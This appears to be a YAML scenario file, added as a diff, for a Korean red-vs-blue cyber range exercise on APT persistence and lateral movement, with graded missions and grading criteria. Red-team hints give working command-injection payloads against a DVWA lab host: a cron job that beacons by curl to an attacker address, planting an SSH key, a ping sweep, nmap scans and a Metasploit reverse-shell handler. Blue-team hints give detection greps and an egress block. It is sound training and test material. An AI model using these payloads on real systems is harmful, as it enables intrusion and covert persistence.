@@ -1,0 +1,322 @@
+id: "apt-phase2"
+title: "APT 2단계: 거점 확보 + 측면 이동"
+description: "APT 그룹이 초기 침투에 성공한 것으로 확인되었다. 2단계에서 Red Team은 지속성을 확보하고(cron, SSH key), 내부 네트워크를 정찰하며 다른 시스템으로 측면 이동해야 한다. Blue Team은 persistence 메커니즘을 탐지하고 새로운 cron 작업이나 SSH 키 추가를 실시간 알림으로 포착해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "DVWA Command Injection을 통해 대상 시스템에 cron 작업을 등록하여 지속성을 확보하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"*/5+*+*+*+*+curl+http://10.20.30.201:8888/beacon\"+|+crontab+-+2>&1&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "MITRE T1053.003 (Cron Job) — 5분마다 attacker 로 outbound beacon. APT persistence 의 가장 단순·강력한 방법. 시스템 재부팅 후에도 살아남음."
+        success_criteria:
+          - "POST /vulnerabilities/exec/ + cmd inject 으로 crontab 추가"
+          - "*/5 * * * * curl http://attacker/beacon (5분 주기)"
+          - "응답에 cron 등록 confirm 또는 silent success"
+        acceptable_methods:
+          - "echo '<cron>' | crontab -"
+          - "echo '<cron>' >> /var/spool/cron/crontabs/<user>"
+          - "/etc/cron.d/ 에 file 생성"
+        negative_signs:
+          - "crontab 등록만 + beacon URL 잘못 (attacker 미존재)"
+          - "permission denied → alternate user 안 시도"
+
+  - order: 2
+    instruction: "Command Injection을 통해 SSH 공개키를 authorized_keys에 추가하는 것을 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;mkdir+-p+~/.ssh;echo+ssh-rsa+AAAAB3test+attacker@apt+>>+~/.ssh/authorized_keys+2>&1&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "MITRE T1098.004 (Account Manipulation: SSH Authorized Keys) — 영구 SSH 백도어. cron 실패 시 fallback persistence."
+        success_criteria:
+          - "mkdir -p ~/.ssh + echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys"
+          - "공개키 형식 정확 (ssh-rsa AAAAB3... user@host)"
+          - "권한 (700/600) 자동 설정 또는 ssh 가 무시"
+        acceptable_methods:
+          - "echo >> ~/.ssh/authorized_keys"
+          - "ssh-copy-id (외부 attacker → 대상)"
+          - "/root/.ssh/authorized_keys (root 권한 시)"
+        negative_signs:
+          - "~ 가 apache home (/var/www) 으로 expand → ssh 불인식"
+          - "공개키 형식 오류 (헤더 누락)"
+
+  - order: 3
+    instruction: "Command Injection으로 내부 네트워크 호스트를 ping 스캔하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;for+h+in+1+80+100+201;do+ping+-c1+-W1+10.20.30.$h+2>&1|grep+ttl;done&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "ttl"
+      semantic:
+        intent: "MITRE T1018 (Remote System Discovery) — 내부 네트워크 호스트 enumeration. 측면 이동 전 target list 확보."
+        success_criteria:
+          - "for loop 으로 10.20.30.1/80/100/201 등 ping"
+          - "응답에 ttl=N (host alive) 라인 1개 이상"
+          - "alive host list 추출"
+        acceptable_methods:
+          - "for h in <list>; do ping -c1 ...; done"
+          - "nmap -sn 10.20.30.0/24 (가능 시)"
+          - "fping -a -g 10.20.30.0/24"
+        negative_signs:
+          - "단일 host 만 ping + sweep 없음"
+          - "ping timeout 무시 (offline host 도 alive 라고 판단)"
+          - "ICMP 차단 환경 — TCP ping 또는 arp 으로 fallback 안 함"
+
+  - order: 4
+    instruction: "내부 SIEM 서버(10.20.30.100)에 대한 포트 스캔을 수행하여 접근 가능한 서비스를 확인하라."
+    hint: "nmap -sV -p 22,443,1514,1515,9200,55000 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+      semantic:
+        intent: "MITRE T1046 (Network Service Discovery) — Wazuh manager 의 표준 port (1514 events / 1515 enrollment / 9200 ES / 55000 API) 식별. 측면 이동 entry point."
+        success_criteria:
+          - "nmap -sV -p <wazuh ports> 10.20.30.100"
+          - "응답에 open port + service version (Wazuh / Elasticsearch / SSH)"
+          - "최소 1개 port 가 open 상태 확인"
+        acceptable_methods:
+          - "nmap -sV -p ..."
+          - "nmap -sT --top-ports 1000 (전체 스캔)"
+          - "masscan + nmap (속도 + 정확도)"
+        negative_signs:
+          - "전체 포트 스캔 (1-65535) — 시간 너무 오래 걸림"
+          - "응답에 open port 없음 (host firewall 차단) — 다른 IP 안 시도"
+
+  - order: 5
+    instruction: "Command Injection으로 대상 시스템의 네트워크 설정과 라우팅 테이블을 수집하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;ip+addr+show;ip+route+show&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+      semantic:
+        intent: "MITRE T1016 (System Network Configuration Discovery) — 대상의 IP/route/gateway/interface 식별. 측면 이동 + pivoting 전략 결정."
+        success_criteria:
+          - "ip addr show + ip route show (또는 ifconfig + netstat -rn)"
+          - "응답에 10.20.30.X (실습 대역) IP + default gw"
+          - "추가 (보너스): nameserver, MAC address"
+        acceptable_methods:
+          - "ip addr + ip route"
+          - "ifconfig + route -n (legacy)"
+          - "/etc/network/interfaces 직접 읽기"
+        negative_signs:
+          - "ip addr 만 + route 누락"
+          - "응답 truncate (head/tail 잘못)"
+
+  - order: 6
+    instruction: "Metasploit으로 리스너를 설정하여 리버스 셸 대기 상태를 만들어라."
+    hint: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "LHOST"
+      semantic:
+        intent: "MITRE T1571 (Non-Standard Port) — Metasploit handler 로 reverse shell catch. APT C2 채널 준비. 4444 는 PoC 표준."
+        success_criteria:
+          - "msfconsole -q -x 명령으로 batch 실행"
+          - "use exploit/multi/handler + PAYLOAD + LHOST + LPORT 설정"
+          - "응답에 LHOST/LPORT/PAYLOAD 설정 확인 라인"
+        acceptable_methods:
+          - "msfconsole -q -x '...'"
+          - "msf-rc 파일 + msfconsole -r"
+          - "ncat -lvp 4444 (단순 wrapper)"
+          - "socat TCP-LISTEN:4444"
+        negative_signs:
+          - "msfconsole interactive 진입 (자동화 부적합)"
+          - "exploit 실행만 + listener 안 됨"
+
+  - order: 7
+    instruction: "Command Injection으로 시스템의 실행 중인 서비스와 열린 포트를 열거하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;ss+-tlnp+2>&1|head+-20&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "LISTEN"
+      semantic:
+        intent: "MITRE T1049 (System Network Connections Discovery) — 대상 system 의 LISTEN port + 프로세스. 추가 attack surface 확보."
+        success_criteria:
+          - "ss -tlnp 또는 netstat -tlnp"
+          - "응답에 LISTEN 상태 port 1개 이상"
+          - "프로세스 이름 (sshd/apache2/...) 노출"
+        acceptable_methods:
+          - "ss -tlnp"
+          - "netstat -tlnp (legacy)"
+          - "lsof -i -P -n | grep LISTEN"
+        negative_signs:
+          - "ss 만 + -tlnp option 누락 (process 정보 없음)"
+          - "응답 truncate"
+
+blue_missions:
+  - order: 1
+    instruction: "웹 서버의 crontab을 점검하여 비인가 cron 작업이 추가되지 않았는지 확인하라."
+    hint: "crontab -l 2>/dev/null; for user in root www-data; do echo \"=== $user ===\"; crontab -u $user -l 2>/dev/null; done"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "==="
+      semantic:
+        intent: "Red #1 cron 백도어 탐지. 모든 user (root/www-data/...) 의 crontab + /etc/cron.d/ 일괄 검사."
+        success_criteria:
+          - "crontab -l (현재 user) + crontab -u <other_users>"
+          - "/etc/cron.d/ + /etc/cron.{daily,hourly,weekly}"
+          - "비정상 entry (외부 IP, /tmp 실행, base64) 식별"
+        acceptable_methods:
+          - "for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done"
+          - "ls /etc/cron.d/ + cat /etc/crontab"
+          - "cat /var/spool/cron/crontabs/*"
+          - "Wazuh syscheck 자동 (파일 변경 감지)"
+        negative_signs:
+          - "현재 user crontab 만 + 다른 user 안 봄"
+          - "/etc/cron.d/ 무시"
+
+  - order: 2
+    instruction: "모든 사용자의 authorized_keys 파일에 비인가 SSH 키가 추가되지 않았는지 점검하라."
+    hint: "find / -name authorized_keys -exec echo '=== {} ===' \\; -exec cat {} \\; 2>/dev/null"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "authorized_keys"
+      semantic:
+        intent: "Red #2 SSH key 백도어 탐지. find 로 전체 system 의 authorized_keys 일괄 audit + 각 file 의 fingerprint 비교."
+        success_criteria:
+          - "find / -name authorized_keys (또는 sshd_config 의 AuthorizedKeysFile)"
+          - "각 file 내용 cat — 모든 등록된 key 노출"
+          - "비정상 user (apache@apt 같은 attacker 시그니처) 식별"
+        acceptable_methods:
+          - "find / -name authorized_keys -exec cat {} \\;"
+          - "ssh-keygen -l -f <file> (fingerprint 추출)"
+          - "auditd watch on .ssh/authorized_keys"
+        negative_signs:
+          - "/root/.ssh/authorized_keys 만 + 다른 user 무시"
+          - "fingerprint 비교 없이 key 신뢰"
+
+  - order: 3
+    instruction: "Wazuh의 syscheck(파일 무결성 모니터링)에서 최근 파일 변경 알림을 확인하라."
+    hint: "grep -i 'syscheck' /var/ossec/logs/alerts/alerts.json | grep -iE 'cron\\|ssh\\|authorized' | tail -20"
+    points: 20
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Wazuh FIM 자동화 — cron/ssh/authorized_keys 파일 변경 시 자동 alert. 운영 환경의 가장 효율적 persistence 탐지."
+        success_criteria:
+          - "/var/ossec/logs/alerts/alerts.json 읽기"
+          - "syscheck rule (550~554) 매칭 + cron/ssh 키워드"
+          - "최근 N분 alert 추출 (시간 필터)"
+        acceptable_methods:
+          - "grep + jq alerts.json"
+          - "Wazuh API: GET /security/agents/<id>/syscheck"
+          - "Kibana FIM dashboard"
+        negative_signs:
+          - "syscheck 미적용 (ossec.conf 의 <syscheck> 미설정)"
+          - "alert 0건인데 alternate evidence (file mtime 직접 비교) 안 함"
+
+  - order: 4
+    instruction: "Apache 접근 로그에서 Command Injection 공격 패턴을 탐지하라."
+    hint: "grep -iE 'exec|;|crontab|ssh|authorized_keys|ping' /var/log/apache2/access.log | tail -30"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "exec"
+      semantic:
+        intent: "Apache access.log 의 URL 에서 cmd inject 페이로드 (/vulnerabilities/exec/ + ;crontab/;ssh) 패턴 탐지. WAF 가 차단 안 한 경우 backup detection."
+        success_criteria:
+          - "access.log grep 으로 cmd inject 키워드 매칭"
+          - "/vulnerabilities/exec/ + body 의 ;cmd 패턴"
+          - "최근 30 line + source IP + URL 추출"
+        acceptable_methods:
+          - "grep -iE 'exec|crontab|ssh|;' access.log"
+          - "awk 분석 (URL 의 ; 출현 빈도)"
+          - "ELK query: url:*exec*"
+        negative_signs:
+          - "access.log path 잘못 (apache2 vs httpd)"
+          - "키워드 매칭 후 분류 없이 raw dump"
+
+  - order: 5
+    instruction: "suricata에서 내부 네트워크 정찰(ping sweep, port scan) 활동을 탐지하라."
+    hint: "grep -iE 'scan\\|icmp\\|ping' /var/log/suricata/fast.log | tail -20"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+      semantic:
+        intent: "Red #3-4 의 ping sweep + nmap 정찰 → Suricata ET sid (scan/icmp 카테고리) 매칭. 측면 이동 전 정찰 단계 차단 신호."
+        success_criteria:
+          - "fast.log 또는 eve.json grep"
+          - "scan/icmp/portscan 시그니처 매칭"
+          - "source IP (10.20.30.80 web from compromise) + dest network"
+        acceptable_methods:
+          - "grep -iE 'scan|icmp|ping' fast.log"
+          - "jq '.event_type==\"alert\" and .alert.signature | contains(\"scan\")' eve.json"
+          - "Wazuh suricata decoder"
+        negative_signs:
+          - "scan rule 매칭 0 (Suricata threshold 너무 높거나 룰셋 누락)"
+          - "alert 보이지만 source IP 분석 없음"
+
+  - order: 6
+    instruction: "nftables에 Command Injection을 통한 아웃바운드 비컨 연결을 차단하라."
+    hint: "nft add rule inet filter output ip daddr 10.20.30.201 tcp dport { 4444, 8888 } drop"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Red #1 의 cron beacon (8888) + #6 의 reverse shell (4444) outbound 차단. egress filtering — APT C2 channel 차단의 핵심."
+        success_criteria:
+          - "nft add rule inet filter output 또는 forward"
+          - "ip daddr <attacker_ip> + tcp dport {4444, 8888} drop"
+          - "rule 적용 후 nft list ruleset 확인"
+        acceptable_methods:
+          - "nft add rule + multi port"
+          - "iptables -A OUTPUT -d <ip> -p tcp -m multiport --dports 4444,8888 -j DROP"
+          - "Cilium / Calico network policy"
+          - "configure_nftables skill"
+        negative_signs:
+          - "input chain 만 + output 누락 (외부 reach 가능)"
+          - "특정 port 만 + 다른 attacker port 우회 가능"
+
+  - order: 7
+    instruction: "웹 서버에서 의심스러운 프로세스와 네트워크 연결을 확인하라."
+    hint: "ss -tnp | grep -v LISTEN | grep -E '4444|8888|ESTABLISHED' 2>/dev/null; ps aux | grep -iE 'nc |ncat|reverse|curl.*beacon' | grep -v grep"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "live 분석 — 현재 active reverse shell 또는 beacon 프로세스 식별. ss + ps 조합."
+        success_criteria:
+          - "ss -tnp (process info 포함 connection)"
+          - "ESTABLISHED + 외부 IP + 의심 port (4444/8888) 매칭"
+          - "ps aux | grep -iE 'nc|ncat|reverse|beacon' (의심 cmd line)"
+        acceptable_methods:
+          - "ss + ps 조합"
+          - "lsof -i -P -n + ps"
+          - "auditd 의 process exec log"
+          - "process_kill skill 로 즉시 격리"
+        negative_signs:
+          - "LISTEN 만 보고 ESTABLISHED 무시"
+          - "ps 결과 grep 없이 raw dump"
+          - "의심 process 발견 후 termination 액션 없음"
